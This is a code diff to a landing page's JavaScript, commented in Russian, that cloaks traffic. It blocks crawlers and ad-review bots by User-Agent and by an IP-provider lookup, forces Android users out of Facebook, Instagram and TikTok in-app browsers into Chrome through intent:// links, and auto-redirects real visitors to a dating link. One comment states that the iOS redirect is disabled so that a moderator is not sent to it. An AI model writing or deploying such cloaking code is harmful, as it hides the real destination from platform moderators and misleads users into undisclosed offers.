@@ -117,7 +117,6 @@ const texts = {
 const lang = navigator.language && navigator.language.toLowerCase().startsWith('ru') ? 'ru' : 'en';
 const ua = navigator.userAgent || '';
 
-// 1. Проверка ботов по User-Agent
 const isBotUA = /bot|crawl|spider|preview|Bytespider|TikTokBot|facebookexternalhit|Facebot|AdsBot|GoogleImageProxy|vkShare|Lighthouse/i.test(ua);
 const isInApp = /FBAN|FBAV|Instagram|Messenger|TikTok|Twitter|GSA|Line/i.test(ua);
 
@@ -128,13 +127,11 @@ function blockAsBot() {
 }
 
 window.onload = async () => {
-    // Шлагбаум №1: Если бот спалился по сигнатуре UA — сразу жесткий блок
     if (isBotUA) {
         blockAsBot();
         return;
     }
 
-    // Шлагбаум №2: Проверка провайдера через более стабильный ip-api.com
     try {
         const response = await fetch('http://ip-api.com/json/?fields=status,as,org');
         if (response.ok) {
@@ -147,37 +144,43 @@ window.onload = async () => {
                 }
             }
         }
-    } catch (e) {
-        // Если API заблокирован или не ответил — едем дальше
-    }
+    } catch (e) {}
 
-    // Загружаем интерфейс для реального человека
+    // Инициализация текстов
     document.getElementById('title').innerText = texts[lang].title;
     document.getElementById('meetText').innerText = texts[lang].meet;
     document.getElementById('tgText').innerText = texts[lang].tg;
     document.getElementById('waText').innerText = texts[lang].wa;
 
-    // 3. Увод во внешний браузер + защита от автоперехода во WebView
+    // Навешиваем событие клика на первую кнопку (Дейтинг)
+    document.getElementById('meetLink').addEventListener('click', function(e) {
+        // Если это Android и мы ВСЕ ЕЩЕ находимся внутри приложения (WebView)
+        if (isInApp && /Android/i.test(ua)) {
+            e.preventDefault(); // Останавливаем обычный переход по ссылке
+            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
+            // Принудительно выбиваем в Chrome при клике
+            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+        }
+    });
+
+    // Логика автоувода при первой загрузке страницы
     if (isInApp) {
         if (/Android/i.test(ua)) {
             const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
-            // Выбиваем в Chrome
             window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end`;
             
-            // Если выбить не удалось (остались в WebView), ПЕРВУЮ ССЫЛКУ НЕ ОТКРЫВАЕМ
             setTimeout(() => {
                 document.getElementById('note').innerText = ''; 
             }, 500);
             return;
         } else {
-            // Если это iOS (iPhone), увод не сработает. 
-            // Остаемся во встроенном браузере FB, авторедирект полностью ОТКЛЮЧЕН ради безопасности.
+            // На iOS убираем авторедирект, чтобы модератор не улетел автоматом
             document.getElementById('note').innerText = ''; 
             return; 
         }
     }
 
-    // 4. Если мы уже во ВНЕШНЕМ браузЕРЕ (Chrome/Safari) — включаем авторедирект на дейтинг
+    // Если открыто в нормальном внешнем браузере — авторедирект через 1.5 сек
     document.getElementById('note').innerText = texts[lang].note;
     setTimeout(() => {
         const autoUrl = document.getElementById('meetLink').getAttribute('href');
